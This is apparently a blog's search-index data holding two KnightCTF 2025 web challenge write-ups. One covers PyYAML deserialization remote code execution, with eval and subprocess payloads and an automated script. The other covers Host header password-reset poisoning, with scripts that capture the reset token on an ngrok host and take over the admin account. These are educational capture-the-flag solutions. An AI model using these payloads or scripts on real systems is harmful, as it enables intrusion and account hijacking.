[{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge Baby Injection from KnightCTF - 2025","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/","tags":["Web Security","Insecure Deserialization"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Challenge Description ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:1","tags":["Web Security","Insecure Deserialization"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appears as follows: The first thing that immediately stands out is the site’s URL: http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE= In fact, that looks like a base64 encoding. Let’s try to decode it: echo \"eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=\" | base64 -d Decoding it, I got the following: yaml: Its yaml bro, hack me if you can!!! So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:2","tags":["Web Security","Insecure Deserialization"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit I personally used this payload: yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"] But many other payloads could have been used, such as: yaml: !!python/object/apply:subprocess.getoutput [\"ls -al\"] Other payloads can be found on PayloadsAllTheThings. So, I simply encoded it in base64: echo \"yaml: python/object/apply:subprocess.getoutput ['ls -al']\" | base64 And that’s how I formed the URL for injecting the “ls -al” command: http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag: ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:3","tags":["Web Security","Insecure Deserialization"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created an automated Python exploit for extracting the flag: import requests import base64 import re url = \"http://172.105.121.246:5990/\" payload = '''yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"]''' print(\"\\nFLAG: \" + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0)) ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:4","tags":["Web Security","Insecure Deserialization"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag KCTF{d38787fb0741bd0efdad8ed01f037740} ","date":"02/04/2025","objectID":"/posts/2025/02/04/baby-injection/:0:5","tags":["Web Security","Insecure Deserialization"],"title":"Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge Admin Access from KnightCTF - 2025","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/","tags":["Web Security","Host Header Injection","Password Reset Poisoning"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appeared as follows, with a login screen: After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That’s when I realized that registering was pointless. Inspecting the page source, I found a strange comment: the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the “Forgot Password” section: Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection. ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:1","tags":["Web Security","Host Header Injection","Password Reset Poisoning"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So i started ngrok on port 80: ngrok http 80 And then, using Burp Suite, I modified the Host header to Host: ngrok_link. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent “Forgot Password” request with the email kctf2025@knightctf.com: After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials: username: kctf2025 password: new_password ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:2","tags":["Web Security","Host Header Injection","Password Reset Poisoning"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created a fully automated exploit that performs the entire process described earlier: ngrok http 8080 (set the ngrok url in the request.py file) python exploit.py python request.py this is exploit.py: import http.server import socketserver import requests import re from urllib.parse import urlparse, parse_qs class MyHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): # Extract the token parameter from the request token = parse_qs(urlparse(self.path).query).get('token', [None])[0] self.send_request(token) def send_request(self, token): s = requests.Session() url = \"http://45.56.68.122:7474/\" password = \"supermario45\" data ={ \"token\":token, \"new_password\":password } # Request for the password reset of the admin account s.post(url+\"reset-password\", data=data).text credentials={ \"username\":\"kctf2025\", \"password\":password } # Request login admin account with Flag extraction via Regex print(\"\\nFLAG: \" + re.search(r'KCTF{[^}]+}', s.post(url, data=credentials).text).group(0)) def start_server(): PORT = 8080 with socketserver.TCPServer((\"\", PORT), MyHandler) as httpd: httpd.serve_forever() if __name__ == \"__main__\": start_server() and this is request.py: import requests requests.post(\"http://45.56.68.122:7474/forgot-password\", data={\"email\":\"kctf2025@knightctf.com\"}, headers={\"Host\":\"6cde-93-70-84-224.ngrok-free.app\"}) ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:3","tags":["Web Security","Host Header Injection","Password Reset Poisoning"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag KCTF{PaSsW0rD_ReSet_p0is0n1ng_iS_FuN} ","date":"02/03/2025","objectID":"/posts/2025/02/03/admin-access/:0:4","tags":["Web Security","Host Header Injection","Password Reset Poisoning"],"title":"Admin Access","uri":"/posts/2025/02/03/admin-access/"}]